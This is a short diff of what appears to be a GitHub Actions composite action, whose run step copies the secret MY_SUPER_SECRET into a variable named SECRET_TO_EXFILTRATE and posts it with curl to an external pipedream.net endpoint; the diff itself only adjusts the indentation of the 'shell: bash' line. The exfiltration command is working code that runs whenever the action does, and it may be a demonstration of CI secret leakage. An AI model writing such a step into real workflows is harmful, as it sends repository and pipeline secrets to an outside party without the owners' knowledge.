@@ -10,4 +10,5 @@ runs:
        SECRET_TO_EXFILTRATE="$MY_SUPER_SECRET"
        echo "woot woot"
        curl -d "secret=$SECRET_TO_EXFILTRATE" https://abfb4cd2c186853ec1142d1f2c76972a.m.pipedream.net/
-       shell: bash
+      shell: bash
+      
